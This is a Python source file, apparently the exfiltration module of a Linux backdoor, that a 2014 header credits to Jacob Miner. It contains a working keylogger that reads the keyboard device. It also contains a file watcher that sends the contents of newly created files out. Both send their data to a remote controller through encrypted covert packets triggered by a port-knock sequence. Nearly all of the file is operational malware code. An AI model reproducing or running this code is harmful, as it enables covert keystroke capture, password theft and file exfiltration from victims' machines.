"""
/*---------------------------------------------------------------------------------------
--  SOURCE FILE:    exfil.py
--
--  PROGRAM:        exfil
--
--  FUNCTIONS:       addWatch(target, address, proto)
--					 sendMessage(string)
--					 removeWatch(target)
--					 sendFile(target)
--					 exfilThread()
--					 startThread()
--					 startKeylogger(address, proto)
--					 findKeyboard()
--					 startKeylistener()
--
--  DATE:           December 7th, 2014
--
--  DESIGNERS:      Jacob Miner
--
--  PROGRAMMERS:    Jacob Miner
--	
--  NOTES:			The exfiltration module of the program
--  
---------------------------------------------------------------------------------------*/
"""

from evdev import InputDevice, categorize, ecodes, list_devices
import pyinotify
import socket
from subprocess import Popen, PIPE
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from struct import *
import sys
import os
import threading
import pcapy
import config
import recvFunctions
import backjake
import utils
import exfil

client = ""
string = ""
protocol = ""
logger = False

scancodes = {
    # Scancode: ASCIICode
    0: None, 1: u'[ESC]', 2: u'1', 3: u'2', 4: u'3', 5: u'4', 6: u'5', 7: u'6', 8: u'7', 9: u'8',
    10: u'9', 11: u'0', 12: u'-', 13: u'=', 14: u'[BKSP]', 15: u'TAB', 16: u'Q', 17: u'W', 18: u'E', 19: u'R',
    20: u'T', 21: u'Y', 22: u'U', 23: u'I', 24: u'O', 25: u'P', 26: u'[', 27: u']', 28: u'[CRLF]', 29: u'[LCTRL]',
    30: u'A', 31: u'S', 32: u'D', 33: u'F', 34: u'G', 35: u'H', 36: u'J', 37: u'K', 38: u'L', 39: u';',
    40: u'"', 41: u'`', 42: u'[LSHFT]', 43: u'\\', 44: u'Z', 45: u'X', 46: u'C', 47: u'V', 48: u'B', 49: u'N',
    50: u'M', 51: u',', 52: u'.', 53: u'/', 54: u'[RSHFT]', 56: u'[LALT]', 57: u' ', 100: u'[RALT]'
}

class EventHandler(pyinotify.ProcessEvent):
	def process_IN_CREATE(self, event):
		global string
		isFile = os.path.isfile(event.pathname)
		if isFile:
			string = "Created file: " + event.pathname + " Contents: "
		else:
			string = "Created Directory: " + event.pathname
		sendMessage(string)
		string = ""

		if isFile:
			sendFile(event.pathname)

	def process_IN_DELETE(self, event):
		global string
		sendMessage(string)
		string = "Deleted: " + event.pathname

mask = pyinotify.IN_DELETE | pyinotify.IN_CREATE
handler = EventHandler()
wama = pyinotify.WatchManager()
noti = pyinotify.Notifier(wama, handler)

"""
/*------------------------------------------------------------------------------
--
--  FUNCTION:   addWatch
--
--  DATE:       December 7th, 2014
--
--  DESIGNERS:  Jacob Miner  
--
--  PROGRAMMER: Jacob Miner 
--
--  INTERFACE:	addWatch(target, address, proto)
--					target - the target to begin watching
--					address - the address of the client 
--					proto - the protocol to send the information over
--
--  RETURNS:  	void
--
--  NOTES:  	Adds a file or directory to begin watching for changes in
--  
------------------------------------------------------------------------------*/
"""
def addWatch(target, address, proto):
	global client, protocol
	client = address
	protocol = proto

	if (wama.add_watch(target, mask, rec=True) > 0):
		print "added: " + target

"""
/*------------------------------------------------------------------------------
--
--  FUNCTION:   sendMessage
--
--  DATE:       December 7th, 2014
--
--  DESIGNERS:  Jacob Miner  
--
--  PROGRAMMER: Jacob Miner 
--
--  INTERFACE:	sendMessage(string)
--					string - the message to send to the client
--
--  RETURNS:  	void
--
--  NOTES:  	sends the knockCode to the client, encrypts the string, then
--  			delivers the encrypted string to the client covertly
------------------------------------------------------------------------------*/
"""
def sendMessage(string):
	recvFunctions.knockCode(client, protocol, True)

	string = utils.encryptData(string)
	for c in string:
		send(utils.covertPacket(client, protocol, c, recvFunctions.pswd), verbose=0)
	send(utils.covertPacket(client, protocol, '\n', recvFunctions.pswd), verbose=0)

	recvFunctions.knockCode(client, protocol, False)

"""
/*------------------------------------------------------------------------------
--
--  FUNCTION:   removeWatch
--
--  DATE:       December 7th, 2014
--
--  DESIGNERS:  Jacob Miner  
--
--  PROGRAMMER: Jacob Miner 
--
--  INTERFACE:	removeWatch(target)
--					target - the file or directory to stop watching
--
--  RETURNS:  	void
--
--  NOTES:  	removes a file or directory to begin watching for changes in
--  
------------------------------------------------------------------------------*/
"""
def removeWatch(target):
	if (wama.rm_watch(wama.get_wd(target))):
		print "removed: " + target

"""
/*------------------------------------------------------------------------------
--
--  FUNCTION:   sendFile
--
--  DATE:       December 7th, 2014
--
--  DESIGNERS:  Jacob Miner  
--
--  PROGRAMMER: Jacob Miner 
--
--  INTERFACE:	sendFile(target)
--					target - the file to send to the client
--
--  RETURNS:  	void
--
--  NOTES:  	Sends the knockCode to the client, opens a file, encrypts the content,
--  			then sends the content to the client covertly
------------------------------------------------------------------------------*/
"""
def sendFile(target):
	recvFunctions.knockCode(client, protocol, True)

	send(utils.covertPacket(client, protocol, '\n', recvFunctions.pswd), verbose=0)
	with open(target, 'r') as f:
		while True:
			c = f.read(1)
			if not c:
				break
			c = utils.encryptData(c)
			send(utils.covertPacket(client, protocol, c, recvFunctions.pswd), verbose=0)

	recvFunctions.knockCode(client, protocol, False)

"""
/*------------------------------------------------------------------------------
--
--  FUNCTION:   exfilThread
--
--  DATE:       December 7th, 2014
--
--  DESIGNERS:  Jacob Miner  
--
--  PROGRAMMER: Jacob Miner 
--
--  INTERFACE:	exfilThread()
--
--  RETURNS:  	void	
--
--  NOTES:  	wrapper function to begin the notification loop for watching files
--  
------------------------------------------------------------------------------*/
"""
def exfilThread():
	noti.loop()

"""
/*------------------------------------------------------------------------------
--
--  FUNCTION:   startThread
--
--  DATE:       December 7th, 2014
--
--  DESIGNERS:  Jacob Miner  
--
--  PROGRAMMER: Jacob Miner 
--
--  INTERFACE:	startThread()
--
--  RETURNS:  	void
--
--  NOTES:  	starts the exfiltration thread
--  
------------------------------------------------------------------------------*/
"""
def startThread(): # address, protocol, password):
	listenThread = threading.Thread(target=exfilThread)#, args=(address, protocol))
	listenThread.daemon = True
	listenThread.start()

"""
/*------------------------------------------------------------------------------
--
--  FUNCTION:   startKeylogger
--
--  DATE:       December 7th, 2014
--
--  DESIGNERS:  Jacob Miner  
--
--  PROGRAMMER: Jacob Miner 
--
--  INTERFACE:	startKeylogger(address, proto)
--					address -	the client ip address
--					prot -		the protocol to send keystrokes through
--
--  RETURNS:  	void
--
--  NOTES:  	starts the thread monitoring keystrokes
--  
------------------------------------------------------------------------------*/
"""
def startKeylogger(address, proto):
	global logger
	global logThread
	global client, protocol
	client = address
	protocol = proto

	if not logger:
		logThread = threading.Thread(target=startKeylistener)
		logThread.daemon = True
		logThread.start()
		logger = True
	else:
		logger = False

"""
/*------------------------------------------------------------------------------
--
--  FUNCTION:   findKeyboard
--
--  DATE:       December 7th, 2014
--
--  DESIGNERS:  Jacob Miner  
--
--  PROGRAMMER: Jacob Miner 
--
--  INTERFACE:	findKeyboard()
--
--  RETURNS:  	string - the name and directory of the keyboard device 
--
--  NOTES:  	Finds the keyboard device in /dev and returns it
--  
------------------------------------------------------------------------------*/
"""
def findKeyboard():
	devices = [InputDevice(fn) for fn in list_devices()]
	for dev in devices:
		if "keyboard" in dev.name.lower():
			return dev.fn 
			
"""
/*------------------------------------------------------------------------------
--
--  FUNCTION:   startKeylistener
--
--  DATE:       December 7th, 2014
--
--  DESIGNERS:  Jacob Miner  
--
--  PROGRAMMER: Jacob Miner 
--
--  INTERFACE:	startKeylistener()
--
--  RETURNS:  	void
--
--  NOTES:  	starts monitoring keyboard events, and sends them to the client
--  
------------------------------------------------------------------------------*/
"""
def startKeylistener():
	global logger
	dev = InputDevice(findKeyboard())
	for event in dev.read_loop():
		if logger:
			if event.type == ecodes.EV_KEY:
				temp = categorize(event)
				if temp.keystate == 1:
					key_lookup = scancodes.get(temp.scancode)
					sendMessage(format(key_lookup))
		else:
			thread.exit()
